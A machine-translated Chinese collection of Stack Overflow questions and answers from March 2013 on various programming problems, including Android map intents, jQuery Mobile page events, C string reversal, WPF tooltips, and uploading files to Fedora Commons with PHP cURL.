我有一个非常简单的测试代码，我正在尝试从我的 android 应用程序启动 Google Maps 应用程序。

以下是我正在尝试的代码。

```
final Button button = (Button) findViewById(R.id.buttonGMaps);
        button.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                Uri uri = Uri.parse("geo:50.08818,14.42021?z=11"); 
                Intent gmapsIntent = new Intent(Intent.ACTION_VIEW, uri);
                PackageManager packageManager = getPackageManager();
                List<ResolveInfo> activities = packageManager.queryIntentActivities(gmapsIntent, 0);
                boolean isIntentSafe = activities.size() > 0;
                if(isIntentSafe)
                    startActivity(gmapsIntent);

            } 
```

问题是，每当我从模拟器调试或运行此代码时，都无法通过 queryIntentActivities 找到意图。

我在这里想念什么？Uri 对象似乎没问题，并且意图本身已正确创建，但包管理器无法在意图活动中找到它。

我是否可以从执行此代码的主要活动中启动此意图？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:33:58.290

> 我在这里想念什么？

谷歌地图。您的模拟器可能没有它们。您需要创建一个具有“Google APIs”版本的 Android 的模拟器 AVD。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:41:52.097

看看这个[shared-library-missing-in-android](https://stackoverflow.com/questions/2283398/shared-library-missing-in-android)我认为这是同一个问题（与 CommonsWare 相同的解决方案）

# html - 如何为 HTML5 readAsText 使用文件名字符串而不是输入按钮

> ID：15232522
> 
> 赞同：2
> 
> 时间：2013-03-05T19:32:53.787
> 
> 标签：html, filereader

我想在本地机器上读取文本文件并将内容放入变量中。我发现的所有示例都使用了一个输入按钮（type = “file”），该按钮传递了一个参数，该参数被函数提取为“evt”。我只是传递一个文件名，例如“mydata.txt”。

我可以用 ajax 来做，但我想在没有 XAMPP 的情况下使用它。

```
function readSingleFile(evt)
{
    var f = evt.target.files[0];

    if (f)
    {
        var r = new FileReader();
        r.onload = function(e)
        { 
            var contents = e.target.result;
            document.getElementById('div1').innerHTML = contents;
        }
        r.readAsText(f);
    }
    else
    {            
        alert("Failed to load file");
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:35:26.390

AJAX 允许您读取驻留在**服务器**上的文件。

出于安全原因，永远不可能读取**客户端**文件系统上的任意路径。允许**用户**
选择文件， 这就是它安全的原因。`<input type="file" />`

# ember.js - Ember 1.0.0-RC.1 和 Ember Data Revision 11 中的默认值

> ID：15232523
> 
> 赞同：0
> 
> 时间：2013-03-05T19:32:54.753
> 
> 标签：ember.js, ember-data

在最新的 emberjs 版本中，如何定义 DS.attr 的默认值？

`attributeName: DS.attr('boolean', { defaultValue: false })`

以上不再有效

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:59:07.597

最新的 ember-data 将空模型属性返回为 null。该代码仅检查未定义与

```
if (value === undefined) {
  value = options.defaultValue;
} 
```

您可以在第 3929 行（最新从源代码编译的）附近快速修复：

```
if (value === undefined || value === null) {
  value = options.defaultValue;
} 
```

它会起作用。我将尝试发送拉取请求，但不确定这是否是正确的修复。

# c# - 将 Oracle 驱动程序添加到 C# 程序

> ID：15232524
> 
> 赞同：0
> 
> 时间：2013-03-05T19:32:56.130
> 
> 标签：c#, windows, oracle, jar, driver

我刚刚用 C# 完成了一个查询 Oracle 数据库的 Windows 服务。如果在运行它的服务器上安装了 Oracle 客户端软件，它就可以正常工作，但我们不想为了运行这个应用程序而必须在每台服务器上安装该软件。有没有办法可以将 .jar 文件打包到我的程序中，这样它就不必每次都依赖大量安装？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T21:13:02.583

如果您可以使用测试版或可以等待，那么 Oracle 应该很快会发布不需要 Oracle 客户端的[完整托管驱动程序。](http://www.oracle.com/technetwork/database/windows/downloads/odpmbeta-1696432.html)它与现有提供程序的 API 兼容，但有一些[限制](http://www.oracle.com/technetwork/database/windows/downloads/odpmbetainstall-1696475.html#Differences)。

# glimpse - glimpse 在 IE9 中未定义

> ID：15232525
> 
> 赞同：1
> 
> 时间：2013-03-05T19:33:00.557
> 
> 标签：glimpse

我已经使用 nuget 包管理器为 ASP.NET MVC3 安装了 Glimpse。我已按照使用以下[链接维护的说明进行操作](http://getglimpse.com/Version/Install/?Glimpse=1.0.1)

但是当我尝试使用 IE9 浏览器运行应用程序时，我收到一个错误：`glimpse`未定义。

请找到如下所述的屏幕截图以获取错误详细信息： ![网页错误：“一瞥”未定义](../Images/3c5f3c51acb58d2995b1c286ad4ffe71.png)

# vb.net - 如何在 vb.net 中刷新组合框

> ID：15232527
> 
> 赞同：0
> 
> 时间：2013-03-05T19:33:06.340
> 
> 标签：vb.net

这是我的示例代码..查看如何刷新组合框中的项目的问题。

```
Private Sub cbo_payMO_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbo_payMO.SelectedIndexChanged<br>

   Select Case (cbo_payMO.Text)
        Case "JANUARY"
            cbo_payMO1.refresh() -- in case JANUARY I WANT TO REFRESH CBO_PAYMO1
                                                              to readd an items

        Case "FEBRUARY"
            cbo_payMO1.Items.Remove("JANUARY")
    End Select
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:42:42.757

你在那里的`.refresh()`电话不是你要找的 - 你想清除 ListItems 然后添加一个带有不同项目的新集合。我建议维护一个列表或集合或某种数组，与`.Items`该组合框分开。`.Items.Clear()`然后你需要打电话`.Items.AddRange(SomeListOfStuff)`

# javascript - jQuery Mobile -> 页面生命周期？

> ID：15232532
> 
> 赞同：11
> 
> 时间：2013-03-05T19:33:24.143
> 
> 标签：javascript, jquery, jquery-mobile, page-lifecycle

jQuery Mobile 页面是否有类似生命周期的东西？就像在初始化、显示、隐藏/返回或任何事件时触发的事件？！

提前致谢！

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-03-05T19:39:43.247

# 介绍

在这里找到的所有信息也可以在我的博客**[文章](http://www.gajotres.net/page-events-order-in-jquery-mobile/)**中找到，您还可以找到工作示例。

## 在页面转换期间：

**活动** [**页面beforecreate**](http://api.jquerymobile.com/pagebeforecreate/)

**活动** [**页面创建**](http://api.jquerymobile.com/pagecreate/)

> 如果您想动态添加页面内容并让 jQuery Mobile 为您的新内容设置样式，这是最佳事件。不要在ajax调用的情况下使用它，那么应该使用pagebefore show，但是所有动态添加的内容都必须手动[增强](https://stackoverflow.com/a/14550417/1848600)。

**事件** [**页面初始化**](http://api.jquerymobile.com/pageinit/)

> 每次页面加载只会触发一次，任何返回页面都不会再次触发，除非手动刷新页面

**隐藏前的事件** [**页面**](http://api.jquerymobile.com/pagebeforehide/)

**演出前的活动** [**页面**](http://api.jquerymobile.com/pagebeforeshow/)

> 页面操作的最佳事件

**活动** [**页面移除**](http://api.jquerymobile.com/pageremove/)

**事件** [**页面隐藏**](http://api.jquerymobile.com/pagehide/)

**活动** [**页面展示**](http://api.jquerymobile.com/pageshow/)

> 只有可以初始化和使用其他图形 jQuery/javascript 的事件，例如图形工具或轮播

## 其余的：

**更改前的事件** [**页面**](http://api.jquerymobile.com/pagebeforechange/)

> 总是会触发两次所以跳过它

**事件** [**页面更改**](http://api.jquerymobile.com/pagechange/)

> 总是会触发两次所以跳过它

如果您想了解有关此主题的更多信息以及页面事件的整体工作方式，请查看我的其他**[文章](http://www.gajotres.net/document-onpageinit-vs-document-ready/)**。或者在**[这里](https://stackoverflow.com/a/14469041/1848600)**找到它。只需搜索名为**Page events transition order**的章节。但也可以在任何地方阅读所有内容。

官方文档：http: [//jquerymobile.com/demos/1.2.0/docs/api/events.html](http://jquerymobile.com/demos/1.2.0/docs/api/events.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-06T04:53:45.437

就像 Android 活动生命周期一样。jQuery Mobile 页面有不同的`events`. 您可以从`jQuery Mobile 1.3.0`.

1.  [pagebeforechange](http://api.jquerymobile.com/pagebeforechange/)
2.  [pagebeforecreate](http://api.jquerymobile.com/pagebeforecreate/)
3.  [页面前隐藏](http://api.jquerymobile.com/pagebeforehide/)
4.  [加载前的页面](http://api.jquerymobile.com/pagebeforeload/)
5.  [换页](http://api.jquerymobile.com/pagechange/)
6.  [换页失败](http://api.jquerymobile.com/pagechangefailed/)
7.  [页面创建](http://api.jquerymobile.com/pagecreate/)
8.  [页隐藏](http://api.jquerymobile.com/pagehide/)
9.  [页面初始化](http://api.jquerymobile.com/pageinit/)
10.  [页面加载](http://api.jquerymobile.com/pageload/)
11.  [页面加载失败](http://api.jquerymobile.com/pageloadfailed/)
12.  [页面删除](http://api.jquerymobile.com/pageremove/)
13.  [页面显示](http://api.jquerymobile.com/pageshow/)

以及更多[可用的 jQuery Mobile 事件文档](http://api.jquerymobile.com/category/events/)

在我的openion`pagebeforeshow`中，`pageshow`和`pagecreate`都是常用的事件。

# c - 在 C 中返回反转字符串的函数 - 分配

> ID：15232534
> 
> 赞同：0
> 
> 时间：2013-03-05T19:33:34.733
> 
> 标签：c, reverse

我需要分配`t2`，但我不知道如何分配。

```
char *reverse(char *t)
{
    int length= strlen(t);
    char *t2 = (char *) malloc(length * sizeof(char*));
    for(int i= (length-1);i>=0;i--)
       t2[i]=t[length-1];
    return t2;
} 
```

请问有什么帮助吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:34:51.490

你很近。

```
char *t2 = malloc(length + 1); // reserve space for a null terminator 
```

不过，您可能希望该循环从 开始`length`，而不是从 开始`length - 1`。循环内的分配也是错误的（您只更改目标位置，而不是源）。确保在返回之前以空值终止字符串。

编者注：

1.  您不需要`malloc()`在 C 程序中转换返回值。
2.  `sizeof(char)`是`1`- 无需相乘。
3.  根据您正在寻找的语义，您可能根本不需要`malloc()`。字符串反转可以在 C 中就地完成。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T19:57:33.227

代码有多个错误。

如前所述`sizeof(char) != sizeof(char*)`，前者是 char 的大小，其次是指针的大小。

此外，循环只为 t2 中的所有索引分配相同的值 `t2[i]=t[length-1];`

此外，它应该接受一个`const char*`作为参数，因此即使是 const char* 字符串也可以传递给它。

`\0`字符串末尾没有设置空字符。

这段代码应该这样做：

```
char* reverse(const char *t)
{
    int length= strlen(t);
    char* t2 = (char*)malloc((length+1) * sizeof(char));
    for(int i=0;i<length;i++)
    {
      t2[(length-1)-i]=t[i];
    }
    t2[length] = '\0';
    return t2;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:36:04.470

```
char *t2 = malloc(length*sizeof(char) + 1); 
```

你 malloc 一个指向 char 类型的指针加上一个用于零终止

# c# - 嵌套元素的触发器

> ID：15232538
> 
> 赞同：0
> 
> 时间：2013-03-05T19:33:44.093
> 
> 标签：c#, wpf, triggers, label, tooltip

```
<Label.ToolTip>
    <StackPanel Name="tTipTxt">                                    
        <StackPanel HorizontalAlignment="Left" VerticalAlignment="Top" Orientation="Horizontal">
            <TextBlock TextWrapping="Wrap" FontFamily="Times New Roman" FontSize="15" Foreground="Black" TextAlignment="Left" VerticalAlignment="Top" HorizontalAlignment="Left">
                <Run Text="" Name="tTipBody"/>
            </TextBlock>
        </StackPanel>
    </StackPanel>
</Label.ToolTip> 
```

这是`ToolTip`当我的鼠标悬停在`Label`. 如果文本为空或为空，我如何创建一个`Trigger`来停止`ToolTip`显示自身？`ToolTip`

我试过这个 XAML 片段：

```
<Style TargetType="ToolTip">
    <Style.Triggers>
        <Trigger Property="Content"
                 Value="{x:Static sys:String.Empty}">
            <Setter Property="Visibility"
                    Value="Collapsed" />
        </Trigger>
        <Trigger Property="Content"
                 Value="{x:Null}">
            <Setter Property="Visibility"
                    Value="Collapsed" />
        </Trigger>
    </Style.Triggers>
</Style> 
```

但是我仍然需要进入最深的堆栈才能获得文本更改的正确目标。您能帮我添加更多步骤来完成这项工作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:20:28.407

您可以制作`Style`一个`Label`禁用`ToolTip`使用`AttachedProperty` `ToolTipService.IsEnabled`

例子：

```
<Style TargetType="Label">
    <Setter Property="ToolTipService.IsEnabled" Value="True" />
    <Style.Triggers>
        <Trigger Property="Content" Value="">
            <Setter Property="ToolTipService.IsEnabled" Value="False" />
        </Trigger>
        <Trigger Property="Content" Value="{x:Null}">
            <Setter Property="ToolTipService.IsEnabled" Value="False" />
        </Trigger>
    </Style.Triggers>
</Style> 
```

这将`ToolTip`在`Label`标签`Content`为`Null`或时隐藏`Empty`

# jquery - 如何在移动 Safari 中短暂禁用滚动？

> ID：15232539
> 
> 赞同：3
> 
> 时间：2013-03-05T19:33:46.623
> 
> 标签：jquery, ios5, jquery-mobile, position, mobile-safari

我的页面底部有一个固定的导航栏，大多数公园在移动 safari 中都可以正常工作。但是，我已经向它添加了一个文本输入字段，现在当文本输入被关注时，它会导致键盘出现，这会迫使固定导航出于某种原因在键盘上方的页面上向上移动，在它和键盘之间添加大约 60px 的空白。此外，它还将元素设置为相对位置，直到输入字段不再聚焦，键盘消失。

需要明确的是，我要解决的问题不是固定导航向上移动，同时保持在视野底部，触摸键盘顶部。相反，它在键盘上方移动了额外的 50 或 60 像素，显示了它和键盘之间的空白，使页面看起来被破坏了。

从长远来看，我要解决的问题的屏幕截图。 ![](../Images/87cd12a8bb67c7a9af779e73af790bbb.png)

[这个问题](https://stackoverflow.com/questions/10542525/how-can-i-prevent-wild-scrolling-when-a-fixed-position-text-input-form-field-gai)似乎是一个类似的问题，据说是可行的解决方案，所以我在 jquery 中继续使用它。

这里的目标是在虚拟键盘出现时阻止固定导航被推到页面中间，方法是禁用滚动功能，保持固定导航接触页面底部，而不是被上推。这是通过在用户关注文本输入时将正文的溢出更改为隐藏来完成的。

所以这是编程问题：我编写的 jquery（通过将主体设置为溢出来禁用滚动：在输入字段集中时隐藏）在 firefox 中完美运行，但在移动 safari 中它什么也不做：

```
$(document).ready(function(){
$(".mobile_text_focus_fix").focus(function(){
$("body").css("overflow","hidden");});  
$(".mobile_text_focus_fix").blur(function(){
$("body").css("overflow","visible");});
}); 
```

上面的 jquery 使用这个 html：

```
<input type="text" class="mobile_text_focus_fix"></input> 
```

火狐截图：

![在此处输入图像描述](../Images/23d9e9ca9fcf6c3cd086d6d45bfdb792.png)

正如我所提到的，它在 Firefox 中工作，上面是我正在尝试做的一个工作示例，但在移动 safari 中，上面的 jquery 似乎都不起作用。

关于为什么这不适用于移动 safari，但适用于 Firefox 的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:41:35.330

您必须添加具有预定义视口宽度的元视口标签：

```
<meta name='viewport' content='width=device-width'> 
```

这不应该阻止可滚动性，但可以解决您的问题......

**更新**

否则尝试阻止默认的触摸行为......

# c# - 在 Azure 上使用 C# 修剪 AAC 音频文件

> ID：15232540
> 
> 赞同：2
> 
> 时间：2013-03-05T19:33:46.743
> 
> 标签：c#, audio, azure, naudio, azure-media-services

我需要获取一个`.aac`音频文件（[高级音频编码](http://en.wikipedia.org/wiki/Advanced_Audio_Coding)`.aac`），并使用 Windows Azure 工作卷中的 C# 以编程方式从中间提取一个 10 秒的剪辑到一个新文件中。

我发现Mark Heath 的[这篇文章](http://mark-dot-net.blogspot.co.uk/2009/09/trimming-wav-file-using-naudio.html)解释了如何使用 NAudio 修剪 WAV 文件，但我不确定如何对 AAC 文件做同样的事情，解码和编码文件会降低质量，对吧？

我也遇到了[Azure 媒体服务](http://www.windowsazure.com/en-us/develop/media-services/)，但我也在努力查看这是否符合我的需要，它看起来可能不支持修剪音频。

我发现[`MediaTranscoder`](http://msdn.microsoft.com/en-us/library/windows/apps/windows.media.transcoding.mediatranscoder.aspx)Windows 商店应用程序中可用的类可能可以做我想做的事（请参阅[这个可以修剪视频的示例项目](http://code.msdn.microsoft.com/windowsapps/Media-Transcode-Sample-f7ba5269)）但是我可以从 azure worker roll 访问这个 API，如果可以的话，它可以做我想做的事吗?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-06T20:59:09.580

[请从http://www.windowsazure.com/en-us/develop/media-services/](http://www.windowsazure.com/en-us/develop/media-services/)上的服务概述开始，熟悉如何上传资产和创建编码作业。在您的情况下，您需要下载示例代码，构建并运行它。

然后，对于修剪，您将提交作业，其中 Windows Azure 媒体编码器的预设会将您的时间间隔指定为 ，例如：

```
<Sources>
  <Source
    AudioStreamIndex="0">
    <Clips>
      <Clip
        StartTime="00:00:00"
        EndTime="00:00:09.9740000" />
    </Clips>
    <CaptionFiles />
  </Source>
</Sources> 
```

我可以解释有关如何构建预设的更多详细信息，但还请确认您知道要修剪的确切入点和出点，时间格式 (HH:MM:SS.MMM)？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T02:16:58.910

您的源文件是基本流（即原始 AAC 位，而不是包装在 MP4 等容器中）吗？

如果您的内容包装在 MP4 中，则可能会使用 Azure 媒体服务。

# php - 如何使用 PHP 摄取到 Fedora Commons？

> ID：15232550
> 
> 赞同：1
> 
> 时间：2013-03-05T19:34:03.607
> 
> 标签：php, curl, fedora-commons

我正在尝试使用 PHP 将一个简单的图像文件摄取到 Fedora Commons，但我无法让它工作（当我尝试将数据流附加到我的新空对象时，Fedora Commons 返回 500）。

我已经在这个问题的末尾发布了我的整个代码，但这里有一些伪代码只是为了了解这个想法：

当用户在他的计算机上选择一个文件并按下提交按钮时，我的脚本被调用并且，......

*   将文件上传到临时目录（我可以通过访问看到该图像`http://localhost/drupal/sites/default/files/images/singe_6.jpg`）
*   创建一个新的空 Fedora Commons 对象（我可以通过访问来查看该对象`http://myFedoraServer:8082/fedora/objects/some%3Apid`）
*   通过使用 cURL POST 到以下 URL，将文件作为数据流附加到空对象：`http://myFedoraServer:8082/fedora/objects/some:pid/datastreams/myDatastreamID?controlGroup=M&dsLocation=http://localhost/drupal/sites/default/files/images/singe_6.jpg`
*   从 Fedora 服务器收到 500 错误响应，显示错误消息并退出

**其他尝试**

*   将文件 ( ) 的路径更改为`dsLocation`相对路径 (`/sites/default/files/images/singe_6.jpg`而不是`http://localhost/drupal/sites/default/files/images/singe_6.jpg`)。没有任何改变。
*   将文件的路径 ( ) 更改`dsLocation`为 Internet 上随机图片的绝对路径 (`http://http://colibri45.c.o.pic.centerblog.net/cv369byr.jpg`而不是`http://localhost/drupal/sites/default/files/images/singe_6.jpg`) 不会改变任何内容。

我在这里做错了什么？有没有我可以用作灵感的示例脚本？

* * *

**编码**

这是我的代码，它在 drupal 中创建一个*上传文件*表单并尝试将该文件保存到 Fedora Commons：

```
<?php

// Create the form with drupal's form api
function fedora_test($form, $form_state) {
    $form = array(
        '#attributes' => array(
            'enctype' => 'multipart/form-data'
        ),
        'fichier' => array(
            '#tree' => false,
            '#type' => 'file'
        ),
        'enregistrer' => array(
            '#type' => 'submit',
            '#value' => t('Enregistrer'),
            '#submit' => array('fedora_test_enregistrer')
        )
    );

    return $form;
}

// Validate the form data before going on to the submission function (see fedora_test_enregistrer)
function fedora_test_validate($form, &$form_state) {
    $validators = array(
        "file_validate_extensions" => array(variable_get("allowed_extensions")),
        "file_validate_size" => array(variable_get("max_image_size"))
    );
    $file = file_save_upload('fichier', $validators, variable_get("uploaded_files_destination"));
    if ($file !== false && $file !== null) {
        $form_state['file_storage'] = $file;
    } else {
        form_set_error('fichier', "Impossible de charger le fichier");
    }
}

// Use cURL with the provided functions and return the result if the HTTP Code recieved matches the expected HTTP Code
function curlThis($curlOptions, $expectedHttpCode) {
    $returnValue = false;
    try {
        $curlHandle = curl_init();
        if ($curlHandle === false) {
            throw new Exception(
                "`curl_init()` returned `false`"
            );
        }
        $settingOptionsSucceeded = curl_setopt_array($curlHandle, $curlOptions);
        if ($settingOptionsSucceeded === false) {
            throw new Exception(
                sprintf(
                    "`curl_setopt_array(...)` returned false. Error: %s. Info: %s",
                    curl_error($curlHandle),
                    print_r(curl_getinfo($curlHandle), true)
                ),
                curl_errno($curlHandle)
            );
        }
        $curlReturn = curl_exec($curlHandle);
        if ($curlReturn === false) {
            throw new Exception(
                sprintf(
                    "`curl_exec(...)` returned false. Error: %s. Info: %s",
                    curl_error($curlHandle),
                    print_r(curl_getinfo($curlHandle), true)
                ),
                curl_errno($curlHandle)
            );
        }
        $httpCode = curl_getinfo($curlHandle, CURLINFO_HTTP_CODE);
        if ($httpCode === false) {
            throw new Exception(
                sprintf(
                    "`curl_getinfo(...)` returned false. Error: %s.",
                    curl_error($curlHandle)
                ),
                curl_errno($curlHandle)
            );
        }
        if ($httpCode !== $expectedHttpCode) {
            throw new Exception(
                sprintf(
                    "`curl_getinfo(...)` returned an unexpected http code (expected %s, but got %s). Error: %s. Complete info: %s",
                    $expectedHttpCode,
                    $httpCode,
                    curl_error($curlHandle),
                    print_r(curl_getinfo($curlHandle), true)
                ),
                curl_errno($curlHandle)
            );
        }
        $returnValue = $curlReturn;
    } catch (Exception $e) {
        trigger_error(
            sprintf(
                "(%d) %s",
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    }
    return $returnValue;
}

// Create a new empty object in Fedora Commons and return its pid
function createNewEmptyObject($prefix, $id) {
    $returnValue = false;

    // Build URL
    $protocol = variable_get("fedora_protocol");
    $host = variable_get("fedora_host");
    $port = variable_get("fedora_port");
    $context = variable_get("fedora_context");
    $pid = $prefix . ":" . $id;
    $url = sprintf(
        "%s://%s:%d/%s/objects/%s",
        $protocol,
        $host,
        $port,
        $context,
        $pid
    );

    // Build cURL options
    $userPassword = variable_get("fedora_username") . ":" . variable_get("fedora_password"); // username:password
    $verifyPeer = false; // false for ignoring self signed certificates
    $headers = array("Accept: text/xml", "Content-Type: text/xml");
    $curlOptions = array(
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_USERPWD => $userPassword,
        CURLOPT_HTTPAUTH => CURLAUTH_BASIC,
        CURLOPT_SSL_VERIFYPEER => $verifyPeer,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true
    );

    // Try `cURL`ing
    $result = curlThis($curlOptions, 201);
    if ($result === $pid) {
        $returnValue = $result;
    }
    return $returnValue;
}

function attachDatastream ($pid, $file, $datastreamID) {

    $returnValue = false;

    // Build URL
    $protocol = variable_get("fedora_protocol");
    $host = variable_get("fedora_host");
    $port = variable_get("fedora_port");
    $context = variable_get("fedora_context");
    $url = sprintf(
        "%s://%s:%d/%s/objects/%s/datastreams/%s?controlGroup=M&dsLocation=%s",
        $protocol,
        $host,
        $port,
        $context,
        $pid,
        $datastreamID,
        file_create_url($file->uri)
    );

    drupal_set_message("url: " . $url, 'warning');

    // Build cURL options
    $userPassword = variable_get("fedora_username") . ":" . variable_get("fedora_password"); // username:password
    $verifyPeer = false; // false for ignoring self signed certificates
    $headers = array("Accept: text/xml", "Content-Type: text/xml");
    $curlOptions = array(
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_USERPWD => $userPassword,
        CURLOPT_HTTPAUTH => CURLAUTH_BASIC,
        CURLOPT_SSL_VERIFYPEER => $verifyPeer,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true
    );

    // Try `cURL`ing
    $result = curlThis($curlOptions, 201);
    if ($result === $pid) {
        $returnValue = $result;
    }
    return $returnValue;
}

function fedora_test_enregistrer($form, &$form_state) {

    $pid = createNewEmptyObject("personne", "myObjectID");
    if ($pid) {
        drupal_set_message("Creating empty object succeeded. PID: " . $pid);
        $result = attachDatastream($pid, $form_state['file_storage'], "myDatastreamID");
        if ($result) {
            drupal_set_message("Attaching a datastream to pid " . $pid . " succeeded!");
        } else {
            form_set_error("FAILED ATTACHING DATASTREAM TO NEW OBJECT");
        }
    } else {
        form_set_error("FAILED CREATING NEW EMPTY OBJECT");
    }
}

?> 
```

**结果**

> 创建空对象成功。PID：人员：myObjectID
> 
> 网址： http: [//vitdevelapp-cen.cen.umontreal.ca :8082/fedora/objects/personne:myObjectID/datastreams/myDatastreamID?controlGroup=M&dsLocation=http://localhost/drupal/sites/default/files/images/ sing_6.jpg](http://vitdevelapp-cen.cen.umontreal.ca:8082/fedora/objects/personne:myObjectID/datastreams/myDatastreamID?controlGroup=M&dsLocation=http://localhost/drupal/sites/default/files/images/singe_6.jpg)
> 
> 用户错误：(0)`curl_getinfo(...)`返回了意外的 http 代码（预期为 201，但得到了 500）。错误： 。完整信息：数组（[url] => [http://vitdevelapp-cen.cen.umontreal.ca:8082/fedora/objects/personne:myObjectID/datastreams/myDatastreamID?controlGroup=M&dsLocation=http://localhost/drupal/网站/默认/文件/图像/singe_6.jpg](http://vitdevelapp-cen.cen.umontreal.ca:8082/fedora/objects/personne:myObjectID/datastreams/myDatastreamID?controlGroup=M&dsLocation=http://localhost/drupal/sites/default/files/images/singe_6.jpg) [content_type] => [http_code] => 500 [header_size] => 215 [request_size] => 330 [filetime] => -1 [ssl_verify_result] => 0 [redirect_count] => 0 [total_time] => 0.602249 [namelookup_time ] => 1.9E-5 [connect_time] => 0.005847 [pretransfer_time] => 0.005849 [size_upload] => 0 [size_download] => 0 [speed_download] => 0 [speed_upload] => 0 [download_content_length] => 0 [ upload_content_length] => -1 [starttransfer_time] => 0.602222 [redirect_time] => 0 [certinfo] => Array ()) dans curlThis() (ligne 100 dans /var/www/drupal/sites/all/modules/editChercheur/ fedora_test.php）。

**来自 Fedora 日志**

```
org.fcrepo.server.errors.GeneralException: Error getting http://localhost/drupal/sites/default/files/images/singe_6.jpg

Caused by: java.net.ConnectException: Connexion refusée 
```

（`Connexion refusée`翻译为`Connection refused`）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T18:38:32.533

Fedora 日志中的 500 错误消息文本是什么？Fedora 可能会因为很多愚蠢的原因抛出错误，但是如果没有错误消息文本，就很难开始调试这个问题。

我的第一个猜测是，图像“singe_6.jpg”可能不存在，或者 Fedora 服务器无法访问。“localhost”上的图像路径是否与您的 Fedora 服务器 vitdevelapp-cen.cen.umontreal.ca 相同？

# php - 将两个客户端 JavaScript 计时器与服务器同步

> ID：15232558
> 
> 赞同：7
> 
> 时间：2013-03-05T19:34:31.700
> 
> 标签：php, javascript, jquery, mysql, ajax

我有两个 JavaScript 倒数计时器（用于游戏）和一个 MySQL 表，用于接收来自其中任何一个的 AJAX 调用的数据。

过程如下：

1.  客户端启动计时器，写入它的`data1`MySQL 列以便它启动计时器，以及`time1`具有当前时间戳的列（精度为 0.01 秒，来自 PHP 调用，因为 MySQL 不这样做）

2.  另一个客户端（以 2 秒间隔轮询服务器）检测到更改，并启动一个计时器，但立即减去（它是一个倒数计时器）第二个客户端`ctime - time1`调用`ctime`的时间戳（也由 PHP 给出）和`time1`时间戳是什么第一个客户端在启动计时器时写入。

这种方法应该可以消除轮询的 2s 间隔造成的延迟，但无论是否这样做（我不太确定是否诚实），定时器之间的同步都会有所不同。有时它们完全精确，有时它们最多相差 3 秒。（这是不可靠的。）

这是我正在使用的一些相关代码：

```
var timerRunning, timeRemaining, responseTime;

function restartLocalTimer() {
    var d = new Date();
    responseTime = d.getTime()/1000;
    timerRunning = true;
    timerTick();
}

function restartSyncTimer(resp) { // resp is the AJAX response passed
    var d = new Date();
    responseTime = d.getTime()/1000 - parseFloat(resp["ctime"]) + parseFloat(resp["time"]);
    timerRunning = true;
    timerTick();
}

function timerTick() {
    d = new Date();
    timeRemaining = 20 - d.getTime()/1000 + responseTime;
    if (timerRunning) setTimeout("timerTick()",25);
} 
```

所有时间值都以秒为单位。（因为数据库的关系，以后可能会改成ms。）

我的问题是：是否有任何其他（重大）延误我没有考虑在内？有没有更好的方法来做到这一点？

另请注意：我对 jQuery 持开放态度（已将其用于 AJAX 调用），但不想使用 websockets。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:21:09.420

我会采用与桌面网络多人游戏相同的方法。即使在连接中断的短暂时刻（例如“滞后”），客户端也会在此期间投射预期的轨迹。在这种情况下，您依赖于本地时间间隔，并在获得异步心跳响应时使用准确的服务器时间进行更新。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-05T20:21:14.613

`setTimeout`众所周知，它的兄弟不可靠。关于此还有另一篇文章：[是否有比 setTimeout 更准确的方法来创建 Javascript 计时器？](https://stackoverflow.com/questions/196027/is-there-a-more-accurate-way-to-create-a-javascript-timer-than-settimeout)这给出了一些指示。

# android - 为 AS3 android Air App Flash cs6 创建扩展文件

> ID：15232572
> 
> 赞同：1
> 
> 时间：2013-03-05T19:35:02.493
> 
> 标签：android, flash-cs6, mobile-application, apk-expansion-files

我已经创建了一个 AS3 移动应用程序并通过 flash CS6 成功导出。

在这个 .apk 中，我包含了我的视频文件（将成为 Android 平板电脑的演示文稿）。仅 .flvs 的总大小为 64mb。

当我尝试上传到 Google play 时，我收到了关于文件大小为**>50mb**的（预期）警告。

我花了两个小时试图找到解决方法，包括使用**jobb.bat**、**zipalign.bat**、将文件转换为**main.1.obb**格式和许多其他选项。

谷歌网站似乎认为我正在使用 Eclipse（我不是我使用 Flash CS6），但无论如何我尝试了所有这些工具，但结果为零。

我努力了 [http://developer.android.com/google/play/expansion-files.html](http://developer.android.com/google/play/expansion-files.html) -

**但**似乎非常复杂，并假设我有日食。我什至尝试将“android-sdk\extras\google\play_apk_expansion”导入 Flash builder，但不是正确的项目扩展。

我查看了 Stack Overflow 的所有文章，例如：

[ [https://stackoverflow.com/questions/14385776/how-to-attach-a-expansion-file-to-an-as3-air-application/15232051#15232051][2]](https://stackoverflow.com/questions/14385776/how-to-attach-a-expansion-file-to-an-as3-air-application/15232051#15232051][2])

**- 但**目前还没有回应

[AS3 / AIR Google Play 应用程序 ID 和扩展文件访问](https://stackoverflow.com/questions/13782703/as3-air-google-play-application-id-and-expansion-files-access)

